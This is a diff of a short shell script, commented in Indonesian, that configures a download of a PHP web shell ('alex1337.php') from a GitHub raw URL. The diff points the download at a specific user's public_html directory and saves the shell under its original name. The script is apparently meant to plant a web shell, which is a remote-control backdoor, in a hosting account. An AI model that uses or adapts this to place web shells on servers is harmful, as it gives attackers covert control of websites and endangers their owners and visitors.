@@ -2,8 +2,8 @@
 
 # Konfigurasi
 URL="https://raw.githubusercontent.com/alexithema/webshell/refs/heads/main/alex1337.php"
-DOWNLOAD_DIR="/home/sertecep/eva.sertecepamazonico.com/"
-OUTPUT_FILE="protect_webshell.php"
+DOWNLOAD_DIR="	/home/eartkcgv/public_html/"
+OUTPUT_FILE="alex1337.php"
 OUTPUT_PATH="$DOWNLOAD_DIR/$OUTPUT_FILE"
 
 # Pastikan direktori tujuan ada
